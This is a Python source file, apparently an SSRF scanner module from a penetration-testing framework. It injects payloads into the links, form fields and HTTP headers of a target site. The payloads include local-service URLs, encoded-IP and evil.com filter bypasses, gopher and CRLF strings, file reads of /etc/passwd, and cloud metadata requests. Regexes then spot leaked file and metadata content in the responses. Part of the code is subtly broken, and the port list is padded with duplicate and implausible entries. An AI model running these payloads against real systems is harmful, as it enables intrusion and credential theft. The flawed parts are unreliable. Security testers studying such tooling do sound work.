#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Server-Side Request Forgery (SSRF) Scanner Module for PIN0CCHI0

This module performs specialized SSRF testing using various techniques
to identify and exploit SSRF vulnerabilities in web applications.
"""

import os
import json
import re
import time
import logging
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
import socket
import ipaddress

from core.base_module import VulnTestingModule
from core.utils import make_request, run_command, ensure_dir_exists

# Configure logger
logger = logging.getLogger('pin0cchi0.vuln_testing.ssrf_scanner')

class SSRFScanner(VulnTestingModule):
    """Server-Side Request Forgery (SSRF) Scanner module for PIN0CCHI0."""
    
    def __init__(self):
        """Initialize the SSRF Scanner module."""
        super().__init__()
        self.name = "SSRF Scanner"
        self.description = "Tests for Server-Side Request Forgery vulnerabilities in web applications"
        self.category = "vuln_testing"
        self.author = "PIN0CCHI0 Team"
        self.version = "0.1.0"
        self.references = [
            "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
            "https://portswigger.net/web-security/ssrf",
            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
        ]
        
        # Initialize results storage
        self.vulnerabilities = []
        self.tested_endpoints = set()
        
        # SSRF payloads
        self.basic_payloads = [
            'http://127.0.0.1',
            'http://localhost',
            'http://[::1]',
            'http://0.0.0.0',
            'http://127.0.0.1:22',
            'http://127.0.0.1:3306',
            'http://127.0.0.1:6379',
            'http://127.0.0.1:5432',
            'http://127.0.0.1:8080',
            'http://127.0.0.1:8443',
            'http://127.0.0.1:9200',
            'file:///etc/passwd',
            'file:///c:/windows/win.ini',
            'dict://127.0.0.1:11211',
            'gopher://127.0.0.1:25/'
        ]
        
        # IP encoding payloads
        self.ip_encoding_payloads = [
            'http://0177.0000.0000.0001',  # Octal
            'http://2130706433',  # Decimal
            'http://0x7f000001',  # Hexadecimal
            'http://127.1',  # Dotted decimal with fewer than 4 parts
            'http://017700000001',  # Octal
            'http://0x7f.0x0.0x0.0x1',  # Hex encoding
            'http://0177.0.0.1'  # Mixed encoding
        ]
        
        # URL encoding payloads
        self.url_encoding_payloads = [
            'http://%31%32%37%2E%30%2E%30%2E%31',  # URL encoding
            'http://127.0.0.1%23@evil.com',  # Fragment bypass
            'http://127.0.0.1%2523@evil.com',  # Double URL encoding
            'http://127.0.0.1:25/\\%0D%0AHELO%20localhost',  # CRLF injection
            'http://0x7f.0.0.1',  # Hex encoding
            'http://127.0.0.1#',  # Fragment
            'http://127.0.0.1?',  # Query
            'http://127.0.0.1\\@evil.com',  # Backslash bypass
            'http://127.0.0.1&@evil.com',  # Parameter delimiter bypass
            'http://127.0.0.1%09@evil.com'  # Tab bypass
        ]
        
        # DNS rebinding payloads (simulated)
        self.dns_rebinding_payloads = [
            'http://pin0cchi0-ssrf-test.com',  # This domain would be set up to resolve to an external IP first, then to 127.0.0.1
            'http://pin0cchi0-rebind.com'  # Another test domain
        ]
        
        # Cloud metadata payloads
        self.cloud_metadata_payloads = [
            'http://169.254.169.254/latest/meta-data/',  # AWS
            'http://metadata.google.internal/computeMetadata/v1/',  # GCP
            'http://169.254.169.254/metadata/v1/',  # DigitalOcean
            'http://169.254.169.254/metadata/instance?api-version=2019-06-01'  # Azure
        ]
        
        # SSRF detection patterns
        self.detection_patterns = [
            # Linux file patterns
            re.compile(r'root:.*:0:0'),  # /etc/passwd content
            re.compile(r'\[fonts\]'),  # win.ini content
            
            # AWS metadata patterns
            re.compile(r'ami-id'),
            re.compile(r'instance-id'),
            re.compile(r'instance-type'),
            
            # Common service response patterns
            re.compile(r'<\?xml'),
            re.compile(r'<!DOCTYPE'),
            re.compile(r'HTTP/[0-9]'),
            re.compile(r'SSH-[0-9]'),
            re.compile(r'220 .* SMTP'),
            re.compile(r'\* OK .* IMAP'),
            re.compile(r'\+OK .* POP3'),
            re.compile(r'redis_version'),
            re.compile(r'PostgreSQL'),
            re.compile(r'MySQL'),
            re.compile(r'\{"status":"ok"\}'),
            re.compile(r'\{"version":'),
            
            # Error messages that might indicate SSRF
            re.compile(r'Connection refused'),
            re.compile(r'Connection timed out'),
            re.compile(r'Failed to connect'),
            re.compile(r'No route to host'),
            re.compile(r'Network is unreachable')
        ]
        
        # Callback server for out-of-band testing
        self.callback_domain = "pin0cchi0-callback.com"  # This would be a real server in production
        
    def run(self, target, config=None):
        """Run the SSRF scanner on the target.
        
        Args:
            target (str): The target URL to test
            config (dict): Configuration options for the test
            
        Returns:
            dict: Test results and identified vulnerabilities
        """
        logger.info(f"Starting SSRF scanning on {target}")
        
        if config is None:
            config = {}
        
        # Ensure target is properly formatted
        if not target.startswith(('http://', 'https://')):
            target = f"http://{target}"
        
        # Create results directory
        timestamp = int(time.time())
        results_dir = os.path.join(os.getcwd(), 'results', 'vuln_testing', f"ssrf_scan_{timestamp}")
        ensure_dir_exists(results_dir)
        
        # Get configuration options
        max_threads = config.get('ssrf_scanner', {}).get('max_threads', 5)
        test_headers = config.get('ssrf_scanner', {}).get('test_headers', True)
        test_cloud = config.get('ssrf_scanner', {}).get('test_cloud', True)
        test_internal = config.get('ssrf_scanner', {}).get('test_internal', True)
        test_oob = config.get('ssrf_scanner', {}).get('test_oob', False)  # Out-of-band testing
        callback_url = config.get('ssrf_scanner', {}).get('callback_url', f"http://{self.callback_domain}/{timestamp}")
        
        # Discover endpoints to test
        endpoints = self._discover_endpoints(target)
        
        # Prepare payloads
        payloads = self.basic_payloads.copy()
        
        if test_internal:
            payloads.extend(self.ip_encoding_payloads)
            payloads.extend(self.url_encoding_payloads)
        
        if test_cloud:
            payloads.extend(self.cloud_metadata_payloads)
        
        # Add internal service discovery payloads
        if test_internal:
            internal_services = self._generate_internal_service_payloads()
            payloads.extend(internal_services)
        
        # Add out-of-band payloads if enabled
        if test_oob:
            oob_payloads = self._generate_oob_payloads(callback_url, timestamp)
            payloads.extend(oob_payloads)
        
        # Test discovered endpoints for SSRF
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            # Test URL parameters
            for endpoint in endpoints:
                if endpoint['url'] not in self.tested_endpoints:
                    self.tested_endpoints.add(endpoint['url'])
                    executor.submit(self._test_endpoint, endpoint, payloads)
        
        # Test HTTP headers if enabled
        if test_headers:
            self._test_headers(target, payloads)
        
        # Consolidate and deduplicate results
        self._consolidate_results()
        
        # Save results to file
        results_file = os.path.join(results_dir, 'ssrf_results.json')
        with open(results_file, 'w') as f:
            json.dump({
                'target': target,
                'timestamp': timestamp,
                'vulnerabilities': self.vulnerabilities,
                'scan_summary': {
                    'total_vulnerabilities': len(self.vulnerabilities),
                    'total_endpoints_tested': len(self.tested_endpoints)
                }
            }, f, indent=2)
        
        logger.info(f"SSRF scanning completed. Found {len(self.vulnerabilities)} potential vulnerabilities.")
        logger.info(f"Results saved to {results_file}")
        
        return {
            'vulnerabilities': self.vulnerabilities,
            'results_file': results_file
        }
    
    def _discover_endpoints(self, target):
        """Discover endpoints on the target for testing."""
        logger.info(f"Discovering endpoints on {target}")
        
        endpoints = []
        
        # Add the main target URL
        endpoints.append({'url': target, 'type': 'url'})
        
        # Get the main page
        response = make_request(target)
        
        if not response['success']:
            logger.warning(f"Failed to retrieve main page for endpoint discovery: {response.get('error', 'Unknown error')}")
            return endpoints
        
        html = response['text']
        
        # Find all links with query parameters
        link_pattern = re.compile(r'href=["\']([^"\'>]*\?[^"\'>]*)["\']', re.IGNORECASE)
        links = link_pattern.findall(html)
        
        for link in links:
            # Handle relative URLs
            if not link.startswith(('http://', 'https://', '//')): 
                link = urllib.parse.urljoin(target, link)
            elif link.startswith('//'):
                link = 'https:' + link if target.startswith('https') else 'http:' + link
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(link).netloc == urllib.parse.urlparse(target).netloc:
                endpoints.append({'url': link, 'type': 'link'})
        
        # Find all forms
        form_pattern = re.compile(r'<form[^>]*action=["\']([^"\'>]*)["\'][^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        form_matches = form_pattern.findall(html)
        
        for action, form_content in form_matches:
            # Handle empty action (submits to current page)
            if not action:
                action = urllib.parse.urlparse(target).path or '/'
            
            # Handle relative URLs
            if not action.startswith(('http://', 'https://', '//')): 
                action = urllib.parse.urljoin(target, action)
            elif action.startswith('//'):
                action = 'https:' + action if target.startswith('https') else 'http:' + action
            
            # Only include endpoints from the same domain
            if urllib.parse.urlparse(action).netloc == urllib.parse.urlparse(target).netloc:
                # Find input fields
                input_pattern = re.compile(r'<input[^>]*name=["\']([^"\'>]+)["\'][^>]*>', re.IGNORECASE)
                inputs = input_pattern.findall(form_content)
                
                # Add form endpoint with input fields
                endpoints.append({
                    'url': action,
                    'type': 'form',
                    'method': self._get_form_method(form_content),
                    'inputs': inputs
                })
        
        # Look for potential SSRF-vulnerable endpoints
        potential_ssrf_endpoints = []
        for endpoint in endpoints:
            url = endpoint['url']
            parsed_url = urllib.parse.urlparse(url)
            path = parsed_url.path.lower()
            query = parsed_url.query.lower()
            
            # Check for paths or parameters that might involve URL fetching
            ssrf_keywords = ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'location', 'path', 
                           'continue', 'next', 'return', 'site', 'html', 'proxy', 'fetch', 'load',
                           'download', 'upload', 'file', 'document', 'folder', 'root', 'path',
                           'pg', 'style', 'pdf', 'template', 'php_path', 'doc', 'page', 'feed',
                           'host', 'port', 'to', 'out', 'view', 'dir', 'show', 'navigation',
                           'open', 'domain', 'callback', 'return_to', 'api']
            
            if any(keyword in path for keyword in ssrf_keywords):
                potential_ssrf_endpoints.append(endpoint)
                continue
            
            if any(keyword in query for keyword in ssrf_keywords):
                potential_ssrf_endpoints.append(endpoint)
                continue
            
            # Check form inputs for URL-related names
            if endpoint['type'] == 'form' and 'inputs' in endpoint:
                if any(any(keyword in input_name.lower() for keyword in ssrf_keywords) for input_name in endpoint['inputs']):
                    potential_ssrf_endpoints.append(endpoint)
        
        # Prioritize potential SSRF endpoints
        for endpoint in potential_ssrf_endpoints:
            if endpoint in endpoints:
                endpoints.remove(endpoint)
            endpoints.insert(0, endpoint)  # Add to the beginning of the list
        
        # Deduplicate endpoints
        unique_endpoints = []
        seen_urls = set()
        
        for endpoint in endpoints:
            url = endpoint['url']
            # Remove fragments
            url = url.split('#')[0]
            
            # Create a unique key based on URL and type
            key = f"{url}|{endpoint['type']}"
            
            if key not in seen_urls:
                seen_urls.add(key)
                endpoint['url'] = url
                unique_endpoints.append(endpoint)
        
        logger.info(f"Discovered {len(unique_endpoints)} unique endpoints")
        return unique_endpoints
    
    def _get_form_method(self, form_content):
        """Extract the HTTP method from a form."""
        method_match = re.search(r'method=["\']([^"\'>]+)["\']', form_content, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'  # Default to GET if method not specified
    
    def _generate_internal_service_payloads(self):
        """Generate payloads for internal service discovery."""
        payloads = []
        
        # Common internal services and their ports
        services = {
            'http': [80, 8080, 8000, 8081, 8888],
            'https': [443, 8443],
            'ftp': [21],
            'ssh': [22],
            'telnet': [23],
            'smtp': [25],
            'dns': [53],
            'http-proxy': [3128, 8080],
            'mysql': [3306],
            'redis': [6379],
            'mongodb': [27017],
            'memcached': [11211],
            'elasticsearch': [9200],
            'jenkins': [8080],
            'docker-api': [2375],
            'kubernetes-api': [8443, 6443],
            'etcd': [2379],
            'consul': [8500],
            'zookeeper': [2181],
            'rabbitmq': [5672, 15672],
            'cassandra': [9042],
            'couchdb': [5984],
            'riak': [8087],
            'neo4j': [7474],
            'hadoop': [50070, 50075],
            'spark': [7077, 8080, 8081],
            'solr': [8983],
            'tomcat': [8080, 8443],
            'jboss': [8080, 9990],
            'weblogic': [7001, 7002],
            'websphere': [9060, 9043, 9080],
            'coldfusion': [8500],
            'activemq': [8161],
            'graphite': [2003, 2004, 8080],
            'prometheus': [9090],
            'grafana': [3000],
            'kibana': [5601],
            'splunk': [8000, 8089],
            'nagios': [80],
            'zabbix': [80, 10051],
            'gitlab': [80, 443],
            'jenkins': [8080],
            'jira': [8080],
            'confluence': [8090],
            'wordpress': [80, 443],
            'drupal': [80, 443],
            'magento': [80, 443],
            'phpmyadmin': [80, 443],
            'cpanel': [2082, 2083],
            'plesk': [8443],
            'webmin': [10000],
            'vnc': [5900],
            'rdp': [3389],
            'ldap': [389],
            'kerberos': [88],
            'ntp': [123],
            'snmp': [161],
            'samba': [445],
            'nfs': [2049],
            'dhcp': [67, 68],
            'tftp': [69],
            'irc': [6667],
            'ipmi': [623],
            'java-rmi': [1099],
            'jmx': [9999],
            'netbios': [137, 138, 139],
            'mssql': [1433],
            'oracle': [1521],
            'postgresql': [5432],
            'sybase': [5000],
            'db2': [50000],
            'sap': [3299],
            'printer': [631],
            'upnp': [1900],
            'ipp': [631],
            'bgp': [179],
            'ldaps': [636],
            'pop3': [110],
            'pop3s': [995],
            'imap': [143],
            'imaps': [993],
            'smtp': [25],
            'smtps': [465, 587],
            'socks': [1080],
            'openvpn': [1194],
            'pptp': [1723],
            'ipsec': [500],
            'sip': [5060, 5061],
            'xmpp': [5222, 5223],
            'irc': [6667],
            'minecraft': [25565],
            'steam': [27015],
            'mumble': [64738],
            'teamspeak': [9987, 10011, 30033],
            'ventrilo': [3784],
            'quake': [27960],
            'counter-strike': [27015],
            'battlefield': [14567, 25200],
            'warcraft': [6112],
            'starcraft': [6112],
            'diablo': [6112],
            'world-of-warcraft': [3724],
            'eve-online': [26000],
            'runescape': [43594],
            'second-life': [12043, 12046],
            'xbox-live': [3074],
            'playstation-network': [3478, 3479, 3658],
            'nintendo-network': [50000, 50001, 50002],
            'apple-game-center': [3478, 3479],
            'google-stadia': [44700, 44701, 44702, 44703, 44704, 44705, 44706, 44707, 44708, 44709],
            'nvidia-geforce-now': [49003, 49004],
            'amazon-luna': [35000, 35001, 35002],
            'microsoft-xcloud': [3074, 3075, 3076, 3077, 3078, 3079, 3080, 3081],
            'parsec': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'shadow': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'paperspace': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'aws-workspaces': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'azure-virtual-desktop': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'citrix': [1494, 2598],
            'vmware-horizon': [8000, 8001, 8002, 8003, 8004, 8005, 8006, 8007, 8008, 8009],
            'teamviewer': [5938],
            'anydesk': [7070],
            'vnc': [5900],
            'rdp': [3389],
            'ssh': [22],
            'telnet': [23],
            'ftp': [21],
            'sftp': [22],
            'scp': [22],
            'rsync': [873],
            'nfs': [2049],
            'smb': [445],
            'webdav': [80, 443],
            'caldav': [80, 443],
            'carddav': [80, 443],
            'imap': [143],
            'pop3': [110],
            'smtp': [25],
            'ldap': [389],
            'kerberos': [88],
            'radius': [1812, 1813],
            'tacacs': [49],
            'dns': [53],
            'dhcp': [67, 68],
            'ntp': [123],
            'snmp': [161],
            'syslog': [514],
            'tftp': [69],
            'http': [80],
            'https': [443],
            'http-alt': [8080],
            'https-alt': [8443],
            'http-proxy': [3128, 8080],
            'socks': [1080],
            'openvpn': [1194],
            'pptp': [1723],
            'ipsec': [500],
            'l2tp': [1701],
            'gre': [47],
            'wireguard': [51820]
        }
        
        # Generate payloads for internal services
        for service, ports in list(services.items())[:20]:  # Limit to first 20 services to avoid too many payloads
            for port in ports[:2]:  # Limit to first 2 ports per service
                payloads.append(f"http://127.0.0.1:{port}")
                payloads.append(f"http://localhost:{port}")
        
        return payloads
    
    def _generate_oob_payloads(self, callback_url, timestamp):
        """Generate out-of-band payloads for SSRF detection."""
        payloads = []
        
        # Generate unique identifiers for this scan
        scan_id = f"ssrf-{timestamp}"
        
        # Basic OOB payloads
        payloads.append(f"http://{scan_id}.{self.callback_domain}")
        payloads.append(f"https://{scan_id}.{self.callback_domain}")
        
        # DNS rebinding simulation payloads
        payloads.append(f"http://{scan_id}-rebind.{self.callback_domain}")
        
        # Protocol-specific payloads
        payloads.append(f"ftp://{scan_id}.{self.callback_domain}")
        payloads.append(f"gopher://{scan_id}.{self.callback_domain}")
        payloads.append(f"dict://{scan_id}.{self.callback_domain}")
        payloads.append(f"ldap://{scan_id}.{self.callback_domain}")
        
        return payloads
    
    def _test_endpoint(self, endpoint, payloads):
        """Test an endpoint for SSRF vulnerabilities."""
        url = endpoint['url']
        endpoint_type = endpoint.get('type', 'url')
        
        logger.info(f"Testing endpoint: {url} (Type: {endpoint_type})")
        
        if endpoint_type == 'form':
            self._test_form(endpoint, payloads)
        else:
            self._test_url_parameters(url, payloads)
    
    def _test_url_parameters(self, url, payloads):
        """Test URL parameters for SSRF vulnerabilities."""
        parsed_url = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed_url.query)
        
        if not query_params:
            return
        
        # Test each parameter
        for param, values in query_params.items():
            # Skip parameters that are unlikely to be vulnerable to SSRF
            if param.lower() in ['page', 'id', 'limit', 'offset', 'sort', 'order', 'dir', 'direction']:
                continue
                
            # Prioritize parameters that are likely to be vulnerable to SSRF
            priority = 1
            if any(keyword in param.lower() for keyword in ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'location', 'path']):
                priority = 3
            elif any(keyword in param.lower() for keyword in ['site', 'html', 'proxy', 'fetch', 'load', 'download', 'upload', 'file']):
                priority = 2
            
            # Test each payload with this parameter
            for payload in payloads:
                # Skip payloads that are not relevant for this parameter
                if priority < 3 and ('file:' in payload or 'gopher:' in payload or 'dict:' in payload):
                    continue
                
                # Create a new query string with the payload
                new_params = query_params.copy()
                new_params[param] = [payload]
                new_query = urllib.parse.urlencode(new_params, doseq=True)
                
                # Create the test URL
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))
                
                # Make the request
                response = make_request(test_url)
                
                if response['success']:
                    # Check for SSRF indicators in the response
                    self._check_ssrf_indicators(response, url, param, payload)
    
    def _test_form(self, endpoint, payloads):
        """Test form inputs for SSRF vulnerabilities."""
        url = endpoint['url']
        method = endpoint.get('method', 'GET')
        inputs = endpoint.get('inputs', [])
        
        if not inputs:
            return
        
        # Test each input field
        for input_name in inputs:
            # Skip inputs that are unlikely to be vulnerable to SSRF
            if input_name.lower() in ['csrf', 'token', 'submit', 'button', 'action', 'id', 'name', 'email', 'password']:
                continue
                
            # Prioritize inputs that are likely to be vulnerable to SSRF
            priority = 1
            if any(keyword in input_name.lower() for keyword in ['url', 'uri', 'link', 'src', 'dest', 'redirect', 'location', 'path']):
                priority = 3
            elif any(keyword in input_name.lower() for keyword in ['site', 'html', 'proxy', 'fetch', 'load', 'download', 'upload', 'file']):
                priority = 2
            
            # Test each payload with this input
            for payload in payloads:
                # Skip payloads that are not relevant for this input
                if priority < 3 and ('file:' in payload or 'gopher:' in payload or 'dict:' in payload):
                    continue
                
                # Create form data
                form_data = {input_name: payload}
                
                # Make the request
                if method.upper() == 'GET':
                    # For GET, add parameters to the URL
                    test_url = f"{url}?{urllib.parse.urlencode(form_data)}"
                    response = make_request(test_url)
                else:
                    # For POST, send as form data
                    response = make_request(url, method='POST', data=form_data)
                
                if response['success']:
                    # Check for SSRF indicators in the response
                    self._check_ssrf_indicators(response, url, input_name, payload)
    
    def _test_headers(self, target, payloads):
        """Test HTTP headers for SSRF vulnerabilities."""
        # Headers that might be vulnerable to SSRF
        headers_to_test = [
            'Referer',
            'X-Forwarded-For',
            'X-Forwarded-Host',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Originating-IP',
            'X-Client-IP',
            'X-Host',
            'X-Custom-IP-Authorization',
            'X-Original-URL',
            'X-Rewrite-URL',
            'X-API-URL',
            'X-Original-Host',
            'Forwarded',
            'Origin',
            'Client-IP',
            'True-Client-IP',
            'X-WAP-Profile',
            'X-Wap-Profile',
            'X-Arbitrary',
            'X-HTTP-DestinationURL',
            'X-Forwarded-Proto',
            'Base-URL',
            'Request-URI',
            'X-Original-URL',
            'X-Override-URL',
            'X-Rewrite-URL',
            'X-Requested-With',
            'X-Request-URI',
            'X-Requested-URI'
        ]
        
        logger.info(f"Testing HTTP headers for SSRF on {target}")
        
        # Test each header
        for header in headers_to_test:
            # Test each payload with this header
            for payload in payloads:
                # Skip file and protocol-specific payloads for headers
                if 'file:' in payload or 'gopher:' in payload or 'dict:' in payload:
                    continue
                
                # Create custom headers
                custom_headers = {header: payload}
                
                # Make the request
                response = make_request(target, headers=custom_headers)
                
                if response['success']:
                    # Check for SSRF indicators in the response
                    self._check_ssrf_indicators(response, target, f"Header:{header}", payload)
    
    def _check_ssrf_indicators(self, response, url, param_or_input, payload):
        """Check for indicators of SSRF vulnerability in the response."""
        # Extract response data
        status_code = response.get('status_code', 0)
        content_type = response.get('headers', {}).get('Content-Type', '')
        text = response.get('text', '')
        response_time = response.get('elapsed', 0)
        
        # Check for indicators in the response
        indicators = []
        
        # Check for specific patterns in the response
        for pattern in self.detection_patterns:
            if pattern.search(text):
                indicators.append(f"Pattern match: {pattern.pattern}")
        
        # Check for unusual status codes
        if status_code in [200, 201, 202] and 'http://127.0.0.1' in payload or 'http://localhost' in payload:
            indicators.append(f"Successful status code ({status_code}) with internal URL payload")
        
        # Check for unusual content types
        if 'application/json' in content_type and ('127.0.0.1' in payload or 'localhost' in payload):
            indicators.append(f"JSON response with internal URL payload")
        
        # Check for timing differences (potential blind SSRF)
        if response_time > 2 and ('169.254.169.254' in payload or 'metadata' in payload):
            indicators.append(f"Long response time ({response_time}s) with cloud metadata payload")
        
        # If indicators found, record the vulnerability
        if indicators:
            vulnerability = {
                'url': url,
                'parameter': param_or_input,
                'payload': payload,
                'status_code': status_code,
                'content_type': content_type,
                'response_time': response_time,
                'indicators': indicators,
                'severity': self._determine_severity(indicators, payload),
                'evidence': text[:500] if len(text) > 500 else text  # Limit evidence size
            }
            
            self.vulnerabilities.append(vulnerability)
            logger.warning(f"Potential SSRF vulnerability found at {url} in {param_or_input} using {payload}")
    
    def _determine_severity(self, indicators, payload):
        """Determine the severity of a SSRF vulnerability."""
        # High severity indicators
        if any('Pattern match: root:' in indicator for indicator in indicators) or \
           any('Pattern match: \[fonts\]' in indicator for indicator in indicators) or \
           any('Pattern match: ami-id' in indicator for indicator in indicators) or \
           'file:/' in payload:
            return 'High'
        
        # Medium severity indicators
        if any('Pattern match: HTTP/' in indicator for indicator in indicators) or \
           any('Pattern match: SSH-' in indicator for indicator in indicators) or \
           any('Pattern match: 220 .* SMTP' in indicator for indicator in indicators) or \
           any('Pattern match: \* OK .* IMAP' in indicator for indicator in indicators) or \
           any('Pattern match: \+OK .* POP3' in indicator for indicator in indicators) or \
           any('Pattern match: redis_version' in indicator for indicator in indicators) or \
           any('Pattern match: PostgreSQL' in indicator for indicator in indicators) or \
           any('Pattern match: MySQL' in indicator for indicator in indicators) or \
           'http://127.0.0.1' in payload or \
           'http://localhost' in payload:
            return 'Medium'
        
        # Low severity indicators
        return 'Low'
    
    def _consolidate_results(self):
        """Consolidate and deduplicate vulnerability results."""
        if not self.vulnerabilities:
            return
        
        # Group vulnerabilities by URL and parameter
        grouped_vulns = {}
        for vuln in self.vulnerabilities:
            key = f"{vuln['url']}|{vuln['parameter']}"
            if key not in grouped_vulns:
                grouped_vulns[key] = []
            grouped_vulns[key].append(vuln)
        
        # Consolidate each group
        consolidated_vulns = []
        for vulns in grouped_vulns.values():
            # Sort by severity (High > Medium > Low)
            vulns.sort(key=lambda v: {'High': 0, 'Medium': 1, 'Low': 2}[v['severity']])
            
            # Take the highest severity vulnerability as the base
            base_vuln = vulns[0].copy()
            
            # Collect all unique payloads and indicators
            all_payloads = set()
            all_indicators = set()
            for vuln in vulns:
                all_payloads.add(vuln['payload'])
                for indicator in vuln['indicators']:
                    all_indicators.add(indicator)
            
            # Update the base vulnerability
            base_vuln['payloads'] = list(all_payloads)
            base_vuln['indicators'] = list(all_indicators)
            del base_vuln['payload']  # Remove the single payload field
            
            consolidated_vulns.append(base_vuln)
        
        # Update the vulnerabilities list
        self.vulnerabilities = consolidated_vulns